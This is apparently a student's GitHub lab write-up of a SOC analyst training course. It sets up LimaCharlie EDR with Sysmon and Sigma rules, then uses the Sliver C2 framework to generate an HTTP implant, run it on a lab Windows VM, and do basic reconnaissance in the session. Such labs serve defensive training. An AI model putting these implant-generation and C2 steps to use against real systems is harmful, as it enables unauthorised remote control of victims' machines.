# So You Want To Be A SOC Analyst Lab by Eric Capuano 

## Objective

Developing my first dashboard & visualization on Elastic to show
- Failed login attempts (All Users)
- Failed login attempts (Disabled Users)
- Failed login attempts (Administrators)

### Skills Learned

- Creating new dashboards and visuals.
- Editing of existing dashboards.

### Tools Used

- Security Information and Event Management (SIEM) Elastic.

## Step 1 - Install LimaCharlie

>What is Lima Charlie?
>LimaCharlie is a very powerful “SecOps Cloud Platform”. It not only comes with a cross-platform EDR agent, but also >handles all of the log shipping/ingestion and has a threat detection engine.

Firstly we need to go to 'https://app.limacharlie.io/signup' to sighn up for a free account

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/b9d0d6cb-c2d4-454b-ab07-7d907759bbca)

We're now loged in to LimaCharlie and i'm ready to create my first Sensor

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/62b51d1b-7b55-4f0b-9312-bd5d7826c003)

After clicking on the 'Add Sensor' blue button i'm going to selct the 'Endpoint' tab then choose 'Windows' and create a new endpoint called 'Windows VM - Lab' and use the x86-64(.exe) architecture.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/a9a4f95a-216b-4e39-957e-5bc4efd67625)

From the desktop we need to open up and Administrative command prompt and cd to the downloads folder

```
cd C:\Users\sywtbsa\Downloads
```

Within this Downloads folder we need to paste in the download executable from the above screen shot with the above command line arguement.

```
lc_sensor.exe -i AAAABgAAAQsFAAAAIzcwMTgyY2Y2MzRjMzQ2YmQubGMubGltYWNoYXJsaWUuaW8AAAABEAIBuwAAAQwFAAAAIzcwMTgyY2Y2MzRjMzQ2YmQubGMubGltYWNoYXJsaWUuaW8AAAABEQIBuwAAAAiBAAAABQAAAAUHAAAAEGUza3YR90Uko4ZwDXxYIkQAAAAJBwAAABAmTAOr6UdDe51nKPOUKmqCAAAABAcAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAcDAAAAAAAAAAYDAAAAAAAAAQ4HAAABJjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOj7/FEdn93dn3eYTnAiKmqkyMz/I+HQp4xy66MyeWgsFI9mVPRYeJabtbySde22Z0QBuDK59304K76o5n9b47vAPFR1b5t+6kcTrXvoLaOTUeinh5W/eqovIUD+alsnRdJQsvB844m8XtizqwzDaforgATed/jAqQLWhr+PcC3rExjz27R0fAtj3Ph4CNYey5We1yUOnKjRKeHFdL9L87Twlsj8u9rwbYWGPKZT3xbqGBmMFKvjKbWHYo81Vcd56KoIiQ5m9BUCplGXqR5dIa8U318jIeSTxKCsx7R1jU125PPHwcAkwa9wjE/fQQBo9QULGZ81mFLK3CGroeRRYpkCAwEAAQ==
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d21dccb4-e18a-408b-93e0-9ae786dcfd1e)

Above is what you should now see.

Lets check the LimaCharlie web sensor

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/3d1fb6bf-b72c-42df-afc3-825491f1780f)

click Finish.

Now let’s configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry

We are going to select “Artifact Collection Service” under “Sensors” and click 'Add Artifact Collection Rule'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2bea3f30-5974-44fa-b268-0a909764f4d1)

Complete with the below
  1. Name: `windows-sysmon-logs`
  2. Platforms: `Windows`
  3. Path Pattern: `wel://Microsoft-Windows-Sysmon/Operational:*`
  4. Retention Period: `10`

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/83fd9367-8d71-4908-a680-d2f82088c3bc)

LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR
agent. The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we are about to enable largely depend on Sysmon logs as that is what most of them were written for.

Last step in this step is to turn on the open source Sigma ruleset to assist our detection effors.

Here is a link to the Sigma Github - https://github.com/SigmaHQ/sigma 

>__What is Sigma?__
>Sigma is a generic and open signature format that allows you to describe relevant log events in a straightforward >manner. The rule format is very flexible, easy to write and applicable to any type of log file.

Click on 'Add-ons' from the top right menu and then choose 'Extensions' from the left menu

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2644f3f6-e33a-403c-98da-e576dd72c2b8)

Then find 'ext-sigma' click on it then choose 'Subscribe'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/15ac0ac1-a0d3-4dbb-a207-9c9068100786)

Thats its for LimaCharlie onto step 2


---


## Step 2 - Prepare for Attack & Defend

#### Generate our C2 Implant

>What is Sliver C2?
>Sliver C2 is an open-source command and control (C2) framework developed by Bishop Fox. It's designed for use in >red teaming, penetration testing, and adversary simulation. It allows security professionals to control and >interact with compromised systems in a controlled and secure manner.

Fisrt we need to start the Sliver Client, we can do this by launching the Ubuntu from our desktop and entering a root shell

```
sudo su
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/ee6d3593-7efc-46db-b80d-c35ad4f3320a)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/79ae0ccd-bad1-4e84-9bad-730b99058653)

The Sliver server is always running in the background of the WSL Ubuntu system. You can confirm that it is running by calling

```
systemctl status sliver
```
If it stops running we can restart it with

```
systemctl start sliver
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/17f2c37c-8828-43e6-aed7-8c9b4b182d6b)

As we can see its active, lets launch it

```
sliver
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2ae44b32-241a-48b4-a94c-340f1906367d)

Now we need to start the HTTP listner, lets check to make sure its not already running. We can check by typing in 

```
jobs
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/e00e82cf-c905-4e92-919d-5e29a34bfff4)

So its not started lets start the HTTP Listener with

```
http
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/847cdf22-00e2-47da-a1bd-948016112580)

Next we need to generate our C2 implant and drop it in to the Downloads folder, confirm the Sliver server now has an implant stored.

```
generate --http 172.25.114.254 --save /mnt/c/Users/sywtbsa/Downloads/
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/1ee0e93f-d2dd-4a86-9f0d-78580709a624)

As we can see from the above screen shot we now have our Payload created in the downloads folder 'ELECTRIC_INEVITABLE.exe'

#### Start a Command and Control Session

Now that the payload is on the Windows VM and the Sliver HTTP listener is running, we’re ready to execute the payload and establish our C2 session.

>__What is a C2 Session?__
>A C2 (Command and Control) session refers to an interactive communication channel established between a compromised device (such as a computer, server, or network device) and an attacker’s command and control server. This session allows the attacker to remotely control the compromised device, execute commands, transfer files, and conduct various malicious activities.

First we need to open an Administrative command prompt and run the following command. Within a few seconds we should see the session on our Sliver server

```
C:\Users\sywtbsa\Downloads\ELECTRIC_INEVITABLE.exe
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d9446ce4-17fd-4743-8028-7b94e54e81f8)

To verify the session on the Sliver server type

```
sessions
```

and to interact with thios session we can enter the below command which includes the session id.

```
use 8fbc4b3c
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/b1b36161-a1da-4e7d-b59a-586cc2ba7499)

We are now interacting directly with the C2 session on the Windows VM. Let’s run a few basic commands to get our bearing on the victim host.

Get basic info

```
info
```

Find out what user your implant is running as, and learn it’s privileges

```
whoami
```

Identify our implant’s working directory

```
pwd
```

Examine network connections occurring on the remote system. This command sometimes takes a little bit to run, be patient.

```
netstat
```

Identify running processes on the remote system

```
ps -T
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/942846d3-702e-44d3-aed6-dc9bd7bbbbb9)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/5466e465-a61b-4910-b3dd-9cb4786382b6)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/62953afb-fe2b-41bb-8875-cd7bea7eaa28)

Notice that Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red. This is how attackers become aware of what security products a victim system may be using.


#### Observe EDR Telemetry So Far

>__What is EDR?__
>EDR stands for Endpoint Detection and Response. It is a cybersecurity technology designed to monitor, detect, and respond to security threats on endpoints, which include computers, mobile devices, and other network-connected devices.

Let get back onto LimaCharlie and check some basic features.

Click on 'Sensors' on the left menu then click on our active windows sensor and then select 'Processes' from the left menu.
Lets explore what we have in this window, we can hover over the icons to see what they are.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d962b66f-f540-4d59-8bec-36de340a0d07)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/f1f8ce30-d39d-4b4b-8a98-a33c4a9ea470) - Listening and active on network

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d080677f-72f6-4add-97f7-87a9de3d45a4) - Signed

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/79d649be-5271-48c0-a474-fe0b520a7820) - Listening on network




















